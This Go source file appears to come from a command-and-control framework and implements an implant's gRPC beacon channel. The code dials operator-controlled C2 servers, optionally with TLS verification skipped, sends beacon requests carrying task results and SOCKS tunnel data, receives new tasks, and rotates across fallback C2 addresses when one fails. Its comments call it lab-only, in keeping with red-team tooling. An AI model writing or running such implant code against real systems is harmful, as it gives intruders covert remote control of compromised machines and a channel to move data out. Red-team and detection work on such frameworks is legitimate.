//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/pkg/c2pb"
	"github.com/forgec2/forgec2/pkg/protocol"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
)

var (
	grpcMu   sync.Mutex
	grpcConn *grpc.ClientConn
	grpcCli  c2pb.C2ServiceClient
	grpcAddr string
)

func initGRPCClient(rawURL string) error {
	grpcMu.Lock()
	defer grpcMu.Unlock()

	useTLS := strings.HasPrefix(rawURL, "grpcs://")
	addr := rawURL
	addr = strings.TrimPrefix(addr, "grpc://")
	addr = strings.TrimPrefix(addr, "grpcs://")
	addr = strings.TrimPrefix(addr, "tcp://")

	if grpcConn != nil && grpcAddr == addr {
		return nil
	}

	closeGRPCLocked()

	var creds credentials.TransportCredentials
	if useTLS {
		// grpcs://: TLS on; SkipTLSVerify matches other C2 transports for lab/self-signed certs
		creds = credentials.NewTLS(newAgentTLSConfig(""))
	} else {
		// grpc:// plain: lab-only insecure transport
		creds = insecure.NewCredentials()
	}

	dialOpts := []grpc.DialOption{
		grpc.WithTransportCredentials(creds),
		grpc.WithDefaultCallOptions(
			grpc.MaxCallRecvMsgSize(16*1024*1024),
			grpc.MaxCallSendMsgSize(16*1024*1024),
		),
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	conn, err := grpc.DialContext(ctx, addr, dialOpts...)
	if err != nil {
		return fmt.Errorf("gRPC dial failed: %w", err)
	}

	grpcConn = conn
	grpcCli = c2pb.NewC2ServiceClient(conn)
	grpcAddr = addr

	if Debug {
		mode := "insecure"
		if useTLS {
			mode = "tls"
		}
		logDebugf("[gRPC] Client connected to %s (%s)", addr, mode)
	}

	return nil
}

func closeGRPCLocked() {
	if grpcConn != nil {
		grpcConn.Close()
		grpcConn = nil
	}
	grpcCli = nil
	grpcAddr = ""
}

func closeGRPCClient() {
	grpcMu.Lock()
	defer grpcMu.Unlock()
	closeGRPCLocked()
}

func grpcSendBeacon(body []byte) ([]byte, error) {
	grpcMu.Lock()
	cli := grpcCli
	grpcMu.Unlock()

	if cli == nil {
		return nil, fmt.Errorf("gRPC not initialized")
	}

	var req protocol.BeaconRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return nil, fmt.Errorf("unmarshal request: %w", err)
	}

	if Debug {
		trunc := req.UUID
		if len(trunc) > 8 {
			trunc = trunc[:8]
		}
		logDebugf("[gRPC] Sending beacon (agent=%s, results=%d, socks=%d)",
			trunc+"...",
			len(req.Results), len(req.SocksData))
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	stream, err := cli.Beacon(ctx)
	if err != nil {
		return nil, fmt.Errorf("gRPC stream open failed: %w", err)
	}

	if err := stream.Send(&req); err != nil {
		return nil, fmt.Errorf("gRPC send failed: %w", err)
	}

	resp, err := stream.Recv()
	if err != nil {
		return nil, fmt.Errorf("gRPC recv failed: %w", err)
	}

	respJSON, err := json.Marshal(resp)
	if err != nil {
		return nil, fmt.Errorf("marshal response: %w", err)
	}

	if Debug {
		logDebugf("[gRPC] Received response (%d bytes, %d tasks)", len(respJSON), len(resp.Tasks))
	}

	return respJSON, nil
}

func sendGRPCBeacon(body []byte) []byte {
	startIdx := currentC2Idx
	for i := 0; i < len(C2URLs); i++ {
		idx := (startIdx + i) % len(C2URLs)
		c2URL := C2URLs[idx]

		if err := initGRPCClient(c2URL); err != nil {
			if Debug {
				fmt.Printf("[!] gRPC connect to %s failed: %v\n", c2URL, err)
			}
			continue
		}

		resp, err := grpcSendBeacon(body)
		if err != nil {
			if Debug {
				fmt.Printf("[!] gRPC beacon to %s failed: %v\n", c2URL, err)
			}
			closeGRPCClient()
			continue
		}

		currentC2Idx = idx
		return resp
	}

	if Debug {
		fmt.Println("[!] All gRPC endpoints failed")
	}
	return nil
}
